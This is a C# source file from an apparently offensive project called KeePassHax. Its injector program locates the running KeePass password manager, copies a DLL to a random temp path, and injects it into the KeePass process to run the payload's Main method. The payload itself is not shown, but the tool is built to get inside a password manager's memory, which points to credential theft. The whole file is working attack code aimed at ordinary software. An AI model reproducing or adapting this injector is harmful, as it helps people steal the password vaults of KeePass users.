using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using KeePassHax.Injector.Injection;

namespace KeePassHax.Injector
{
    internal static class Program
    {
        private const string DllPath = @"D:\Projects\DotNet\KeePassHax\KeePassHax\bin\Debug\net461\KeePassHax.dll";

        public static void Main(string[] args)
        {
            try
            {
                var newPath = CopySelfToTemp();
                Console.WriteLine("Will inject dll from location " + newPath);

                var proc = Process.GetProcessesByName("KeePass").Single();

                var injector = new FrameworkV2Injector {Log = Console.WriteLine};
                injector.Inject(proc.Id, new InjectionArguments
                {
                    Path = newPath,
                    Namespace = nameof(KeePassHax),
                    Type = nameof(KeePassHax.Program),
                    Method = nameof(KeePassHax.Program.Main),
                    Argument = "",
                }, false);
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }
        }

        private static string CopySelfToTemp()
        {
            var currentPath = typeof(KeePassHax.Program).Assembly.Location;
            var newPath = Path.Combine(Path.GetTempPath(), Guid.NewGuid() + ".dll");
            File.Copy(currentPath, newPath);

            return newPath;
        }
    }
}